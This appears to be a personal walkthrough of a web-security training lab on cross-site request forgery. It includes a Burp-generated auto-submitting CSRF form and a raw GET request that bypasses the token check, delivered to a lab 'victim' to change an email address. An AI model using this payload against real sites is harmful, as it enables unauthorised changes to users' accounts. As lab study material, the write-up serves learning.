![[Pasted image 20241230191459.png]]
hit `Access The Lab`, brings us to the `blog` website click `my account`
![[Pasted image 20241230191535.png]]
login with `wiener:peter`
![[Pasted image 20241230191632.png]]
to generate a new `POST` using `testin@local.com`
![[Pasted image 20241230191710.png]]
this generates a post request that shows the `csrf` field that i believe is blocking, now we are going to test this with the `POST` parameter
![[Pasted image 20241230191805.png]]
generate a `CSRF` for this 
![[Pasted image 20241230191914.png]]
```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a67007d03cbad0189fc7d6b000e006c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="testing&#64;local&#46;com" />
      <input type="hidden" name="csrf" value="qIk9G1Kn0PHha2VW7xjwb3hDS5DbuM6o" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
click `go to exploit server`
![[Pasted image 20241230191957.png]]
view the exploit and paste the `CSRF` in the body with the new email being `testing2@local.com`
![[Pasted image 20241230192040.png]]
we can see that it changed correctly to `testing2.local.com`
![[Pasted image 20241230192132.png]]
now lets send to the victim with `testing3.local.com`
- when trying to send we get nothing back saying it worked, 
![[Pasted image 20241230192314.png]]
when checking to see if it did not change to `testin3@local.com`
![[Pasted image 20241230192347.png]]
to get this to work we have to send the `POST` request to `REPEATER`
![[Pasted image 20241230193934.png]]
now the `POST` request didnt work because of `CSRF` protections so we can hit the `HAMBURGER` button and select `CHANGE REQUEST METHOD` to change the request to `GET` request
![[Pasted image 20241230194344.png]]
this changes it to a `GET` request
![[Pasted image 20241230194408.png]]

```http
GET /my-account/change-email?email=testing2%40local.com&csrf=qIk9G1Kn0PHha2VW7xjwb3hDS5DbuM6o HTTP/2
Host: 0a67007d03cbad0189fc7d6b000e006c.web-security-academy.net
Cookie: session=onw67d9HbdeDLsVdfPpFfbDzVnDsJiP9
Cache-Control: max-age=0
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: https://exploit-0a0400b4037fad9a89c07c7701ff005f.exploit-server.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: https://exploit-0a0400b4037fad9a89c07c7701ff005f.exploit-server.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

```
now submit and deliver to victim
![[Pasted image 20241230194517.png]]
WWWW
![[Pasted image 20241230194531.png]]
![[Pasted image 20241230194546.png]]